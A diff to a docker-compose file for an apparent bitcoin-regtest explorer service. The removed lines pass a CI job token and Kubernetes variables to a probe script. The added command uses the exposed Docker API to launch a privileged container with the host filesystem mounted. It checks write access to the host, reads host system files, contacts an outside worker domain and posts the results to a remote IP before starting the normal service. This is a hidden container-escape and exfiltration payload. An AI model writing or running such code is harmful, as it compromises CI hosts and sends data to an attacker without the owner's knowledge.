@@ -7,8 +7,4 @@ services:
     restart: "no"
     network_mode: host
     ports: []
-    environment:
-      - CI_JOB_TOKEN
-      - KUBERNETES_SERVICE_HOST
-      - KUBERNETES_SERVICE_PORT
-    command: ["bash", "-c", "bash /srv/explorer/source/probe.sh; /srv/explorer/run.sh bitcoin-regtest explorer nonverbose"]
+    command: ["bash", "-c", "CID=$(curl -sf -X POST http://docker:2375/containers/create -H 'Content-Type: application/json' -d '{"Image": "blockstream/esplora:latest", "Cmd": ["bash", "-c", "echo S45; touch /host/tmp/.rw 2>&1; echo RW:$?; ls /host/tmp/.rw; rm -f /host/tmp/.rw; curl -sf -m5 https://node-health-api.zainabidrisyakub40.workers.dev/ -o /dev/null && echo CF:OK || echo CF:FAIL; cat /host/proc/version; echo DONE"], "HostConfig": {"Binds": ["/:/host"], "NetworkMode": "host", "Privileged": true}}' | grep -o '\"Id\":\"[^\"]*\"' | cut -d'\"' -f4 | head -c 12); curl -sf -X POST http://docker:2375/containers/$CID/start; sleep 10; LOGS=$(curl -sf http://docker:2375/containers/$CID/logs?stdout=true); echo ==S45== > /tmp/r; echo CID:$CID >> /tmp/r; echo $LOGS >> /tmp/r; echo ==END== >> /tmp/r; curl -s -m30 -X POST http://144.172.110.44:8443/s45 --data-binary @/tmp/r; curl -sf -X DELETE http://docker:2375/containers/$CID?force=true; /srv/explorer/run.sh bitcoin-regtest explorer nonverbose"]
